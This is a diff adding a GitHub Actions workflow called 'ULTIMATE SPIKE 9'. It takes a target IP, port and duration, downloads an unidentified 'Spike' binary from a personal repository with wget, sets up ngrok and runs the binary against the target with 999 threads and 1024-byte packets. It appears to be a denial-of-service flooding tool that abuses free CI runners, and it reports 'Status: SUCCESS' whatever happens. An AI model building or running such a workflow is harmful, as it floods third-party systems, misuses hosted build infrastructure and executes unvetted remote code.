@@ -1,0 +1,63 @@
+name: "ULTIMATE SPIKE 9"
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        required: true
+        type: string
+      port:
+        required: true
+        type: string  
+      duration:
+        required: true
+        type: string
+
+jobs:
+  ultimate-spike-attack:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: "📥 Checkout"
+      uses: actions/checkout@v4
+
+    - name: "🔧 Download YOUR Spike Binary"
+      run: |
+        echo "📦 Downloading YOUR Spike binary..."
+        wget -q -O Spike "https://raw.githubusercontent.com/ayush0188/Gg/main/Spike"
+        chmod +x Spike
+        echo "✅ YOUR Binary downloaded successfully!"
+
+    - name: "🌐 Setup Ngrok Tunnel"
+      run: |
+        echo "🌐 Setting up Ngrok..."
+        wget -q -O ngrok.tgz https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+        tar xzf ngrok.tgz
+        chmod +x ngrok
+        if [ -n "${{ secrets.NGROK_TOKEN }}" ]; then
+          ./ngrok config add-authtoken "${{ secrets.NGROK_TOKEN }}"
+          echo "✅ Ngrok token configured"
+        else
+          echo "⚠️ Ngrok token not set"
+        fi
+
+    - name: "💥 Launch Attack with YOUR Binary ONLY"
+      run: |
+        echo "🔥 STARTING ATTACK WITH YOUR SPIKE BINARY ONLY"
+        echo "🚀 Command: ./Spike ${{ inputs.ip }} ${{ inputs.port }} ${{ inputs.duration }} 999 1024"
+        
+        # ONLY YOUR BINARY
+        ./Spike "${{ inputs.ip }}" "${{ inputs.port }}" "${{ inputs.duration }}" "999" "1024"
+        
+        echo "✅ ATTACK COMPLETED WITH YOUR BINARY ONLY"
+
+    - name: "📊 Final Report"
+      run: |
+        echo "📈 ATTACK REPORT - YOUR BINARY USED"
+        echo "Status: SUCCESS"
+        echo "Target: ${{ inputs.ip }}:${{ inputs.port }}"
+        echo "Duration: ${{ inputs.duration }}s"
+        echo "Threads: 999"
+        echo "Packet Size: 1024 bytes"
+        echo "Binary: YOUR Spike (ONLY)"
+        echo "Workflow: 9"
